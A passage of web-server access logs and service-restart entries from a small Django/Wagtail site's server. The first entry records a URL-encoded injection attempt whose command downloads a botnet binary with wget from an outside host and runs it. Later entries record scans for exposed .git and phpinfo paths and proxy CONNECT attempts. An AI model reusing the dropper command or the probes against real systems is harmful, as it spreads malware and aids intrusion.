+dc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.50%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20\
+%2A%3B%20.%2Fboatnet.arm7%20tbk","headers":{"Cookie":["REDACTED"],"Connection":["keep-alive"],"Accept-Encoding":["gzip, \
+deflate"],"Accept":["*/*"],"User-Agent":["Mozilla/5.0"]}},"bytes_read":0,"user_id":"","duration":0.000053835,"size":0,"s\
+tatus":308,"resp_headers":{"Location":["https://188.245.60.20/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc\
+=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.50%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2\
+A%3B%20.%2Fboatnet.arm7%20tbk"],"Content-Type":[],"Server":["Caddy"],"Connection":["close"]}}
+Oct 08 14:19:32 topquaranta-server caddy[2211644]: {"level":"info","ts":1759933172.8241892,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"5.189.141.59","remote_port":"44020","client_ip":"5.189.141.59","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept-Encoding":["gzip"],"Connection":["close"],\
+"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/\
+537.36"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]}},"bytes_read":0,"user_id":"","dur\
+ation":0.000212931,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://\
+188.245.60.20/"],"Content-Type":[]}}
+Oct 08 14:20:02 topquaranta-server caddy[2211644]: {"level":"info","ts":1759933202.567625,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"50662","client_ip":"204.76.203.219","proto":\
+"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Connection":["keep-alive"],"Accept-Encoding":[\
+"gzip, deflate","gzip, deflate"],"Accept":["*/*"],"X-Requested-With":["XMLHttpRequest"],"Content-Type":["application/x-w\
+ww-form-urlencoded; charset=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"User-Agent":["Mozilla/5.0 (Windows NT\
+ 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000018502,"size":0,"status":308,"resp_headers":{"Connection":["close"],"Location":["htt\
+ps://188.245.60.20/"],"Content-Type":[],"Server":["Caddy"]}}
+Oct 08 14:38:52 topquaranta-server caddy[2211644]: {"level":"info","ts":1759934332.6288369,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.201","remote_port":"33534","client_ip":"195.178.110.201","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.git/refs/tags/","headers":{"User-Agent":["Mozilla/5.0 (Linu\
+x; webOS/2.2.4; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) webOSBrowser/221.56 Safari/534.6 Pre/3.0"],"Accept-Chars\
+et":["utf-8"],"Accept-Encoding":["gzip"],"Connection":["close"]}},"bytes_read":0,"user_id":"","duration":0.000128827,"si\
+ze":0,"status":308,"resp_headers":{"Connection":["close"],"Location":["https://188.245.60.20/.git/refs/tags/"],"Content-\
+Type":[],"Server":["Caddy"]}}
+Oct 08 14:53:28 topquaranta-server caddy[2211644]: {"level":"info","ts":1759935208.3413758,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"20.65.194.61","remote_port":"50048","client_ip":"20.65.194.61","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20","uri":"/portal/redlion","headers":{"Accept-Encoding":["gzip"],"User-Agent"\
+:["Mozilla/5.0 zgrab/0.x"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000120549,"size":0,"status":308,"\
+resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/portal/redlion"],"Content-Ty\
+pe":[]}}
+Oct 08 15:06:50 topquaranta-server caddy[2211644]: {"level":"info","ts":1759936010.6052558,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"34656","client_ip":"176.65.132.111","proto"\
+:"HTTP/1.1","method":"GET","host":"world.hana-api.com","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Linux; Android 6\
+.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36"]}},"bytes_read":\
+0,"user_id":"","duration":0.000034723,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"L\
+ocation":["https://world.hana-api.com/"],"Content-Type":[]}}
+Oct 08 15:13:51 topquaranta-server caddy[2211644]: {"level":"info","ts":1759936431.0248868,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"42608","client_ip":"176.65.132.111","proto"\
+:"HTTP/1.1","method":"GET","host":"one-api.ir","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; \
+x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","duration":0.\
+000281204,"size":0,"status":308,"resp_headers":{"Connection":["close"],"Location":["https://one-api.ir/"],"Content-Type"\
+:[],"Server":["Caddy"]}}
+Oct 08 15:15:58 topquaranta-server caddy[2211644]: {"level":"info","ts":1759936558.9992557,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"43436","client_ip":"176.65.132.111","proto"\
+:"HTTP/1.1","method":"GET","host":"one-api.ir","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; \
+x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","duration":0.\
+000236018,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://one-api.i\
+r/"],"Content-Type":[]}}
+Oct 08 15:25:40 topquaranta-server caddy[2211644]: {"level":"info","ts":1759937140.598133,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"80.66.75.121","remote_port":"39794","client_ip":"80.66.75.121","proto":"HTT\
+P/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"X-Requested-With":["XMLHttpRequest"],"Content-Type\
+":["application/x-www-form-urlencoded; charset=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"User-Agent":["Mozi\
+lla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.\
+818.46"],"Accept-Encoding":["gzip, deflate","gzip, deflate"],"Accept":["*/*"],"Connection":["keep-alive"]}},"bytes_read"\
+:0,"user_id":"","duration":0.000157879,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"\
+Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 15:45:47 topquaranta-server caddy[2211644]: {"level":"info","ts":1759938347.8196733,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"104.152.52.226","remote_port":"45567","client_ip":"104.152.52.226","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"User-Agent":["curl/7.61.1"],"Accept":["*/*"],"Co\
+nnection":["close"]}},"bytes_read":0,"user_id":"","duration":0.000235964,"size":0,"status":308,"resp_headers":{"Server":\
+["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 15:51:19 topquaranta-server caddy[2211644]: {"level":"info","ts":1759938679.780861,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"185.224.128.17","remote_port":"57308","client_ip":"185.224.128.17","proto":\
+"HTTP/1.1","method":"CONNECT","host":"example.com:80","uri":"example.com:80","headers":{"Connection":["keep-alive"]}},"b\
+ytes_read":0,"user_id":"","duration":0.000261115,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":[\
+"close"],"Location":["https://example.com/"],"Content-Type":[]}}
+Oct 08 15:54:19 topquaranta-server caddy[2211644]: {"level":"info","ts":1759938859.3381963,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"43.166.136.153","remote_port":"57880","client_ip":"43.166.136.153","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Connection":["keep-alive","close"],"Pragma":["no\
+-cache"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) Apple\
+WebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"],"Accept":["text/html,application/xhtml+x\
+ml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Enc\
+oding":["gzip"],"Accept-Language":["zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"],"Cache-Control":["no-cache"]}},"bytes_read":0,\
+"user_id":"","duration":0.000041898,"size":0,"status":308,"resp_headers":{"Connection":["close"],"Location":["https://18\
+8.245.60.20/"],"Content-Type":[],"Server":["Caddy"]}}
+Oct 08 16:31:03 topquaranta-server caddy[2211644]: {"level":"info","ts":1759941063.816474,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"53268","client_ip":"204.76.203.219","proto":\
+"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Wi\
+n64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"],"Accept":["*/*"],"X\
+-Requested-With":["XMLHttpRequest"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"Accept-Encoding":["gzip, deflate","gz\
+ip, deflate"],"Connection":["keep-alive"],"Content-Type":["application/x-www-form-urlencoded; charset=UTF-8"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000022911,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"C\
+onnection":["close"],"Location":["https://188.245.60.20/"]}}
+Oct 08 16:31:40 topquaranta-server caddy[2211644]: {"level":"info","ts":1759941100.6975815,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.212","remote_port":"36708","client_ip":"204.76.203.212","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept":["*/*"],"X-Requested-With":["XMLHttpR\
+equest"],"Content-Type":["application/x-www-form-urlencoded; charset=UTF-8"],"Accept-Encoding":["gzip, deflate","gzip, d\
+eflate"],"Connection":["keep-alive"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"User-Agent":["Mozilla/5.0 (Windows N\
+T 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"]}},"bytes_\
+read":0,"user_id":"","duration":0.000159743,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["clos\
+e"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 16:50:01 topquaranta-server caddy[2211644]: {"level":"info","ts":1759942201.2896688,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.201","remote_port":"45796","client_ip":"195.178.110.201","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.git/config","headers":{"Connection":["close"],"User-Agent":\
+["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"],"Accept\
+-Charset":["utf-8"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","duration":0.000275074,"size":0,"status":30\
+8,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/.git/config"],"Content-Ty\
+pe":[]}}
+Oct 08 17:11:54 topquaranta-server caddy[2211644]: {"level":"info","ts":1759943514.210596,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"3.132.23.201","remote_port":"58946","client_ip":"3.132.23.201","proto":"HTT\
+P/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Macintosh; Intel Mac OS X \
+10_15_7) Chrome/126.0.0.0 Safari/537.36"],"Accept":["*/*"],"Accept-Encoding":["gzip"]}},"bytes_read":0,"user_id":"","dur\
+ation":0.000275327,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://\
+188.245.60.20/"],"Content-Type":[]}}
+Oct 08 17:14:56 topquaranta-server caddy[2211644]: {"level":"info","ts":1759943696.0452957,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.201","remote_port":"58038","client_ip":"195.178.110.201","prot\
+o":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/_profiler/phpinfo","headers":{"User-Agent":["Mozilla/5.0 (OS\
+/2; Warp 4.5; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35"],"Accept-Charset":["utf-8"],"Accept-Encoding":["gzip"\
+],"Connection":["close"]}},"bytes_read":0,"user_id":"","duration":0.000039193,"size":0,"status":308,"resp_headers":{"Ser\
+ver":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/_profiler/phpinfo"],"Content-Type":[]}}
+Oct 08 17:31:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759944701.3203418,"msg":"got renewal info","nam\
+es":["topquaranta.cat"],"window_start":1762096196,"window_end":1762251645,"selected_time":1762196560,"recheck_after":175\
+9966301.3202329,"explanation_url":""}
+Oct 08 17:31:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759944701.3250563,"logger":"tls.cache.maintenan\
+ce","msg":"updated and stored ACME renewal information","identifiers":["topquaranta.cat"],"cert_hash":"69827b325e335dd4a\
+3b239fa8d7e59e00f0b2d256e62859208782427eb86abc1","ari_unique_id":"jw0TovYuftFQbDMYOF1ZjiNykco.BsId8m3fv0zg60K8v0k9fMLP",\
+"cert_expiry":1764764751,"selected_time":1762194926,"next_update":1759966301.3202329,"explanation_url":""}
+Oct 08 17:31:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759944701.4750397,"msg":"got renewal info","nam\
+es":["www.topquaranta.cat"],"window_start":1762096198,"window_end":1762251647,"selected_time":1762227056,"recheck_after"\
+:1759966301.4750183,"explanation_url":""}
+Oct 08 17:31:41 topquaranta-server caddy[2211644]: {"level":"info","ts":1759944701.4784338,"logger":"tls.cache.maintenan\
+ce","msg":"updated and stored ACME renewal information","identifiers":["www.topquaranta.cat"],"cert_hash":"b963af8e8eb12\
+25ffc2912f6e86283953b876601f66384bb8d6ca20beb3dc7cb","ari_unique_id":"jw0TovYuftFQbDMYOF1ZjiNykco.BpGZcnY7pEFPf3uhjx36lE\
+BV","cert_expiry":1764764753,"selected_time":1762161214,"next_update":1759966301.4750183,"explanation_url":""}
+Oct 08 17:46:09 topquaranta-server caddy[2211644]: {"level":"info","ts":1759945569.1382825,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"3.131.215.38","remote_port":"32942","client_ip":"3.131.215.38","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Accept-Encoding":["gzip"],"User-Agent":["Mozilla/5.0\
+ (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","du\
+ration":0.000041183,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"],"L\
+ocation":["https://188.245.60.20/"]}}
+Oct 08 17:49:06 topquaranta-server caddy[2211644]: {"level":"info","ts":1759945746.785073,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"3.131.215.38","remote_port":"32926","client_ip":"3.131.215.38","proto":"HTT\
+P/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Accept":["*/*"],"Accept-Encoding":["gzip"],"User-Agen\
+t":["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","dur\
+ation":0.00026958,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://1\
+88.245.60.20/"],"Content-Type":[]}}
+Oct 08 17:51:45 topquaranta-server caddy[2211644]: {"level":"info","ts":1759945905.8753326,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.15","remote_port":"39138","client_ip":"195.178.110.15","proto"\
+:"HTTP/1.1","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000189236,"size":0\
+,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 17:51:45 topquaranta-server caddy[2211644]: {"level":"info","ts":1759945905.9007835,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.15","remote_port":"39142","client_ip":"195.178.110.15","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"User-Agent":["l9tcpid/v1.1.0"],"Connection":["cl\
+ose"]}},"bytes_read":0,"user_id":"","duration":0.000042641,"size":0,"status":308,"resp_headers":{"Location":["https://18\
+8.245.60.20/"],"Content-Type":[],"Server":["Caddy"],"Connection":["close"]}}
+Oct 08 17:59:49 topquaranta-server caddy[2211644]: {"level":"info","ts":1759946389.5796542,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"176.97.210.9","remote_port":"35720","client_ip":"176.97.210.9","proto":"HT\
+TP/1.1","method":"CONNECT","host":"httpbin.org:443","uri":"httpbin.org:443","headers":{"User-Agent":["Go-http-client/1.1\
+"]}},"bytes_read":0,"user_id":"","duration":0.000075888,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server"\
+:["Caddy"],"Connection":["close"],"Location":["https://httpbin.org/"]}}
+Oct 08 18:20:36 topquaranta-server caddy[2211644]: {"level":"info","ts":1759947636.9007275,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"55358","client_ip":"204.76.203.219","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept":["*/*"],"Connection":["keep-alive"],"\
+User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safar\
+i/537.36 Edg/90.0.818.46"],"X-Requested-With":["XMLHttpRequest"],"Content-Type":["application/x-www-form-urlencoded; cha\
+rset=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"Accept-Encoding":["gzip, deflate","gzip, deflate"]}},"bytes_\
+read":0,"user_id":"","duration":0.000206884,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["clos\
+e"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 18:24:46 topquaranta-server caddy[2211644]: {"level":"info","ts":1759947886.9279158,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"20.83.32.182","remote_port":"41368","client_ip":"20.83.32.182","proto":"HT\
+TP/1.1","method":"GET","host":"188.245.60.20","uri":"/developmentserver/metadatauploader","headers":{"Accept":["*/*"],"A\
+ccept-Encoding":["gzip"],"User-Agent":["Mozilla/5.0 zgrab/0.x"]}},"bytes_read":0,"user_id":"","duration":0.000213039,"si\
+ze":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/developm\
+entserver/metadatauploader"],"Content-Type":[]}}
+Oct 08 18:29:14 topquaranta-server caddy[2211644]: {"level":"info","ts":1759948154.6830554,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"195.178.110.109","remote_port":"43306","client_ip":"195.178.110.109","prot\
+o":"HTTP/1.1","method":"GET","host":"","uri":"/","headers":{}},"bytes_read":0,"user_id":"","duration":0.000120872,"size"\
+:0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 18:29:14 topquaranta-server caddy[2211644]: {"level":"info","ts":1759948154.708686,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"195.178.110.109","remote_port":"34344","client_ip":"195.178.110.109","proto\
+":"HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"User-Agent":["l9tcpid/v1.1.0"],"Connection":["c\
+lose"]}},"bytes_read":0,"user_id":"","duration":0.00001973,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Con\
+nection":["close"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 18:32:24 topquaranta-server caddy[2211644]: {"level":"info","ts":1759948344.4669,"logger":"http.log.access","msg"\
+:"handled request","request":{"remote_ip":"205.210.31.237","remote_port":"52339","client_ip":"205.210.31.237","proto":"H\
+TTP/1.0","method":"GET","host":"","uri":"/","headers":{"User-Agent":["Hello from Palo Alto Networks, find out more about\
+ our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"],"Accept":["*/*"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000192022,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close\
+"],"Location":["https:///"],"Content-Type":[]}}
+Oct 08 18:46:29 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949189.4409351,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56580","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/","headers":{"Accept-Encoding":["identity"],"Accept":["text/html\
+,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],"User-Agent":["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 \
+(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","duration":0.000097341,"size":0,"st\
+atus":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/"],"Content-Type"\
+:[]}}
+Oct 08 18:46:31 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949191.0738785,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56582","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/robots.txt","headers":{"Accept-Encoding":["identity"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000030414,"size":0,"status":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"C\
+onnection":["close"],"Location":["https://188.245.60.20/robots.txt"]}}
+Oct 08 18:46:32 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949192.497881,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56584","client_ip":"207.90.244.28","proto":"H\
+TTP/1.1","method":"GET","host":"188.245.60.20","uri":"/sitemap.xml","headers":{"Accept-Encoding":["identity"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000038488,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close\
+"],"Location":["https://188.245.60.20/sitemap.xml"],"Content-Type":[]}}
+Oct 08 18:46:33 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949193.4197965,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"56596","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/.well-known/security.txt","headers":{"Accept-Encoding":["identit\
+y"]}},"bytes_read":0,"user_id":"","duration":0.000020466,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Conne\
+ction":["close"],"Location":["https://188.245.60.20/.well-known/security.txt"],"Content-Type":[]}}
+Oct 08 18:46:36 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949196.0252402,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"207.90.244.28","remote_port":"47838","client_ip":"207.90.244.28","proto":"\
+HTTP/1.1","method":"GET","host":"188.245.60.20","uri":"/favicon.ico","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 1\
+0.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"],"Connection":["keep-alive"]\
+,"Accept-Encoding":["gzip, deflate"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000191544,"size":0,"sta\
+tus":308,"resp_headers":{"Content-Type":[],"Server":["Caddy"],"Connection":["close"],"Location":["https://188.245.60.20/\
+favicon.ico"]}}
+Oct 08 18:48:46 topquaranta-server caddy[2211644]: {"level":"info","ts":1759949326.7286246,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"145.90.8.11","remote_port":"48952","client_ip":"145.90.8.11","proto":"HTTP\
+/1.1","method":"HEAD","host":"188.245.60.20:80","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64;\
+ x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"]}},"bytes_read":0,"user_id":"","durati\
+on":0.000098515,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/"],"Content-Type":[],"Server":[\
+"Caddy"],"Connection":["close"]}}
+Oct 08 19:00:14 topquaranta-server caddy[2211644]: {"level":"info","ts":1759950014.738544,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"176.65.132.111","remote_port":"37404","client_ip":"176.65.132.111","proto":\
+"HTTP/1.1","method":"GET","host":"one-api.ir","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x\
+64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"]}},"bytes_read":0,"user_id":"","duration":0.0\
+00322894,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://one-api.ir\
+/"],"Content-Type":[]}}
+Oct 08 19:40:26 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952426.5127764,"logger":"tls","msg":"cleanin\
+g storage unit","storage":"FileStorage:/var/lib/caddy/.local/share/caddy"}
+Oct 08 19:40:26 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952426.517875,"logger":"tls","msg":"finished\
+ cleaning storage units"}
+Oct 08 19:40:43 topquaranta-server caddy[2211644]: {"level":"info","ts":1759952443.4892101,"logger":"http.log.access","m\
+sg":"handled request","request":{"remote_ip":"204.76.203.212","remote_port":"52194","client_ip":"204.76.203.212","proto"\
+:"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"Accept-Encoding":["gzip, deflate","gzip, defl\
+ate"],"Accept":["*/*"],"X-Requested-With":["XMLHttpRequest"],"Content-Type":["application/x-www-form-urlencoded; charset\
+=UTF-8"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb\
+Kit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"],"Connection":["keep-alive"]}},"bytes_\
+read":0,"user_id":"","duration":0.00005777,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close\
+"],"Location":["https://188.245.60.20/"],"Content-Type":[]}}
+Oct 08 20:25:42 topquaranta-server caddy[2211644]: {"level":"info","ts":1759955142.198244,"logger":"http.log.access","ms\
+g":"handled request","request":{"remote_ip":"204.76.203.219","remote_port":"35388","client_ip":"204.76.203.219","proto":\
+"HTTP/1.1","method":"GET","host":"188.245.60.20:80","uri":"/","headers":{"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Wi\
+n64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"],"Accept":["*/*"],"C\
+onnection":["keep-alive"],"Content-Type":["application/x-www-form-urlencoded; charset=UTF-8"],"Accept-Encoding":["gzip, \
+deflate","gzip, deflate"],"X-Requested-With":["XMLHttpRequest"],"Accept-Language":["en US,en;q=0.9,sv;q=0.8"]}},"bytes_r\
+ead":0,"user_id":"","duration":0.000101989,"size":0,"status":308,"resp_headers":{"Location":["https://188.245.60.20/"],"\
+Content-Type":[],"Server":["Caddy"],"Connection":["close"]}}
+
+Oct 08 20:43:48 topquaranta-server gunicorn[3300788]: [2025-10-08 20:43:48 +0000] [3300788] [ERROR] Worker (pid:3300792)\
+ was sent SIGTERM!
+Oct 08 20:43:48 topquaranta-server gunicorn[3300788]: [2025-10-08 20:43:48 +0000] [3300788] [ERROR] Worker (pid:3300793)\
+ was sent SIGTERM!
+Oct 08 20:43:48 topquaranta-server gunicorn[3300788]: [2025-10-08 20:43:48 +0000] [3300788] [INFO] Shutting down: Master
+Oct 08 20:43:48 topquaranta-server systemd[1]: topquaranta_web.service: Deactivated successfully.
+Oct 08 20:43:48 topquaranta-server systemd[1]: Stopped TopQuaranta - Wagtail (Django) public site.
+Oct 08 20:43:48 topquaranta-server systemd[1]: topquaranta_web.service: Consumed 4.855s CPU time.
+Oct 08 20:43:48 topquaranta-server systemd[1]: Started TopQuaranta - Wagtail (Django) public site.
